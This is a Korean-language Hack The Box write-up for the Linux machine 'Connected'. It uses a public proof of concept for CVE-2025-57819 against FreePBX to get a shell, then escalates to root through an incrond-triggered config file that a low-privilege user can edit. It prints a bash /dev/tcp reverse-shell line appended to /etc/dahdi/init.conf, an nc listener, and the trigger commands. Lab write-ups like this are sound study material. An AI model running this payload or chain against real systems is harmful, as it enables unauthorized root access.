---
title: "[HTB] Connected (Easy_Linux)"
date: 2026-06-07 14:32:00 +09:00
categories: [Security & Hacking, HTB]
tags: [Hack The Box, hacking, RedLabs, Linux]
password: "20260607"
---

[HTB_Connected_호롱고양이.pptx](https://github.com/user-attachments/files/28923605/HTB_Connected_.pptx)

![Connected solved](https://github.com/user-attachments/assets/c470096b-87d6-4e1a-be49-29f10caa8b0c#.png)

[Congratulations OilLampCat! You are player #1173 to have solved Connected.](https://labs.hackthebox.com/achievement/machine/988787/906#.png)

## 1. 시작에 앞서

![connected](https://github.com/user-attachments/assets/8e2ff29e-ab3f-4fc0-bf1c-67b160928281#.png)

오랜만에 여행 다녀와서 다시 풀어본 리눅스 문제.

~~easy 난이도이기도 하고 초기 침투 부분이 딸깍으로 풀려버려서 점수가 2.7 대가 나온듯 하다.~~

~~이번엔 복잡한 부분이 그다지 없었기에 세부 목록을 나누지는 않겠다.~~

발표 자료를 만들며 풀었던 문제를 다시 보고 했는데, 이거 왜 점수가 낮았던거지? 지금에 와서지만 더 알게되니 오히려 난 점수를 높게 주고 싶은데?

## 2. 정찰 및 정보 수집 (Reconnaissance & Enumeration) 

![nmap](https://github.com/user-attachments/assets/e6a898a4-4cf2-4724-8138-ba080745cca0#.png)

nmap의 결과에서 22, 80, 443번 포트가 열려있음을 확인할 수 있었다. 

![etc](https://github.com/user-attachments/assets/79b3ef36-4f95-41a9-a021-740431ed36db#.png)

ip와 dns도 시켜주고

![site](https://github.com/user-attachments/assets/c1daf6a2-3eaa-43b1-a2e2-8de0292a1503#.png)

사이트에 방문해보면 작아서 잘 안보이겠지만 저 아래 `FreePBX 16.0.40.7`이라는 버전을 볼 수 있다.

![취약점 검색](https://github.com/user-attachments/assets/d0bb6599-32d6-4acb-9d30-32093a792103#.png)

구글에 버전을 이용해 취약점을 검색하면 바로 여러가지가 나온다.

![자세히](https://github.com/user-attachments/assets/f0a8b447-3f41-4230-bd04-83edccf8ebdb#.png)

그 중 특히 `CVE-2025-57819`가 눈에 띈다. **Unauthenticated RCE/SQLi**라니!

## 3. 초기 침투 (Initial Foothold / Exploitation)

![github](https://github.com/user-attachments/assets/e843239c-b652-4ca4-88c0-e76bcb7cfc37#.png)

이제 초기 침투를 진행하기에 앞서 github를 통해 공격에 쓸 poc 코드를 찾아보자.

![CVE](https://github.com/user-attachments/assets/24cede6e-958b-4c6f-82ce-f9db6aa6a416#.png)

[b4sh2/CVE-2025-57819-poc](https://github.com/b4sh2/CVE-2025-57819-poc)코드를 이용했다.

![rce1](https://github.com/user-attachments/assets/b4c6450e-0ba6-4cb7-9731-5d0e963c2fac#.png)

![RCE2](https://github.com/user-attachments/assets/2b327736-3080-42ae-ab39-92fbb3d20287#.png)

코드를 실행시키면 위와같이 **FreePBX** 라는 것이 실행되며 쉘에 접속을 할 수 있고 여기 userflag가 있다.

## 4. 권한 상승 (Privilege Escalation) 

![기본 정보](https://github.com/user-attachments/assets/940936a2-7540-41c2-89e9-e3bbee0243e5#.png)

그룹과 id를 확인해보니 asterisk로 되어있었고

![sudol](https://github.com/user-attachments/assets/1a104e47-cb5f-4204-947f-1aee57365d1c#.png)

**sudo -l**의 경우 TTY가 존재하지 않는다면서 사용 불가능했다.

![cron](https://github.com/user-attachments/assets/b5afe24a-8c6f-4152-9319-48f3cc4b5c0d#.png)

그룹 권한으로 찾아봤을 땐 또 뭐가 엄청 많았고 그걸 다 둘러보기 전 **crontab**을 둘러봤다만 흠... 딱히?

![ps](https://github.com/user-attachments/assets/7441a882-9d5b-4179-af10-fd193dbdcbc0#.png)

프로세스를 스캔하면서 커널쪽 프로세스는 제거하여 보니 `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` 을 이용했을 때 봤던 `/usr/sbin/incrond` 라는 데몬이 루트 권한으로 돌고 있는 것을 확인했다.

![netstat](https://github.com/user-attachments/assets/bdd8176f-5d0e-436b-a3d0-b602354afd1c#.png)

혹시 내부에서 돌고있는 포트가 있나 하여 찾아봤지만 여기도 딱히?

### 4-1. incrond

일단 찾았던 **incrond**가 있으니 이게 무엇인지 간단히 알아보자.

> incrond (Inotify Cron Daemon)

crond는 시간마다 감시하고 그런거라면 이녀석은 리눅스에서 파일 시스템의 변화(이벤트)를 감지하고 자동화 명령을 실행하는 백그라운드 서비스이다.

그리고 이번 문제를 푸는데 있어 아주 중요한 역할을 하는 것이기도 하고.

![incrond](https://github.com/user-attachments/assets/e3c98f49-3b89-4ea3-83e6-67c4ae2945f3#.png)

위처럼 `/etc/incron.d/`를 읽어보면

`감시 대상 / 이벤트 / 실행할 명령`  순으로 구성되어있다.

> 이벤트

- `IN_CREATE` : 파일/폴더가 생성될 때
- `IN_MODIFY` : 파일 내용이 수정될 때
- `IN_CLOSE_WRITE` : 파일을 쓰기 모드로 열었다가 저장하고 닫을 때

### 4-1. incrond 이용하기

![권한 확인](https://github.com/user-attachments/assets/b608073e-98c1-40ea-ae0b-b2ee89ce14be#.png)

게다가 권한을 확인해보니 **incron.d**는 root 권한으로 실행은 되는데 그게 실행시키는 스크립트들이 **asterisk** 즉 내가 갖고있는 유저의 소유인데다가 수정이 가능했다.

> 여기서 잠깐, 이 문제에 쓰인 FreePBX라는 서비스 자체가 본래 incron 에 지금처럼 `/var/spool/asterisk/sysadmin`이 존재하여 이것 자체로 취약점이다! 라고 할 수는 없다.
>
> 아무래도 이번 문제의 경우엔 이 블로그보단 발표 자료를 더 자세하게 작성했던지라 그거 보는걸 추천한다.
>
> ![이거](https://github.com/user-attachments/assets/4461021e-f06e-42d7-a025-35e986f3406c#.png)
>
> ![이거2](https://github.com/user-attachments/assets/8b349494-00af-4d26-a80f-9b3e1f374dc6#.png)
>
> 이런 내용들이 있으니 참고해라.

![sysadmindahdirestart](https://github.com/user-attachments/assets/6aa22d52-ce40-41f4-a5b9-5b2b0f1d1461#.png)

근데 지금 보면 다른 것들은 incron 뒤에 나오는 명령어부분을 다 열어보며 둘러봤을 때 딱히 취약한 부분을 찾지 못했는데 `/usr/sbin/sysadmin_dahdi_restart`를 열어보니 `/etc/init.d/dahdi`로 명령어를 실행시키고 이걸 또 들어가보니

![init.d](https://github.com/user-attachments/assets/2b18e87c-4260-4e69-882c-e64067ac9646#.png)

여기서 `.` 기호로 (source) `/etc/dahdi/init.conf` 파일을 실행한다.

좀 뭔가 꼬여서 설명을 하고 있는데 정리를 해보자면

```
[방아쇠 발생] dahdi_restart 파일 변경
      ↓
[incron 데몬] Root 권한으로 /usr/sbin/sysadmin_dahdi_restart 실행
      ↓
[서비스 제어] Root 권한으로 /etc/init.d/dahdi restart 실행
      ↓
[취약점 포인트] Root 권한 상태에서 /etc/dahdi/init.conf 파일을 '.'(Source) 기호로 불러와 실행
      ↓
(이때 /etc/dahdi/init.conf 파일은 일반 유저인 asterisk가 마음대로 수정할 수 있는 상태!)
```

이렇게 되어있겠다.

### 4-3. 최종 권한 상승 (Exploitation)

![payload](https://github.com/user-attachments/assets/66b6cf5b-231e-4150-91c6-8de99b3612b7#.png)

이제 모든 퍼즐 조각이 맞춰졌으니, Root 권한으로 실행되는 `/etc/dahdi/init.conf` 파일 맨 뒤에 나한테 연결될 리버스 쉘 페이로드를 주입할 차례이다.

여기서 아주 흥미로운 사각지대와 함정이 존재했는데, 백엔드 스크립트가 `init.conf`를 불러오는 시점에는 아직 시스템 환경 변수(`$PATH`)에 파이썬 3 등이 위치한 `/usr/local/bin` 경로가 등록되지 않은 상태였다. 게다가 부모 쉘이 `/bin/sh` 기반이라 일반적인 `/dev/tcp` 문법도 단독으로는 먹히지 않았다.

이 함정을 파괴하기 위해, 환경 변수의 영향을 받지 않고 `/bin/sh` 내부에서도 Bash의 내장 네트워크 기능을 강제로 깨울 수 있는 **절대 경로 기반의 Bash 페이로드**를 설계하여 주입했다.

```bash
echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.16.47/4446 0>&1" &' >> /etc/dahdi/init.conf
```

`/bin/bash -c` 절대경로를 지정해줬다.

그리고 다른 창에서 `rlwrap -cAr nc -lvnp 4446` 로 리스너를 열어준 후

```bash
echo 'trigger2' > /var/spool/asterisk/sysadmin/dahdi_restart
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

위 명령어로 `incrond` 데몬에 `IN_CLOSE_WRITE` 이벤트를 발생시키면?

![짜잔](https://github.com/user-attachments/assets/0981efc8-80ef-4f4e-94c6-dd8df2fc8afd#.png)

리버스 쉘을 받을 수 있었다.

![대체 텍스트 입력](https://github.com/user-attachments/assets/a6b14e04-9a24-496e-b16f-fda91ae8ce31#.png)

루트 계정으로 받았기에 플래그를 읽어주면? 끝!

## 마치며

![connected pwned](https://github.com/user-attachments/assets/1a76607b-18eb-408c-b4a5-3f19b641d4ef#.png)

리눅스 문제 하나 끝!

~~이번 문제는 그래도 하루안에 끝내버려서 다음 문제를 또 풀어야 할지도?~~

라고 했으나 정작 발표 자료를 만들며 보니 이거 나 어떻게 풀었던거지? 싶은 문제였다.

첨엔 이걸 굳이 발표할 정도의 문제인가? 싶었는데, 음... 할만 할거 같다.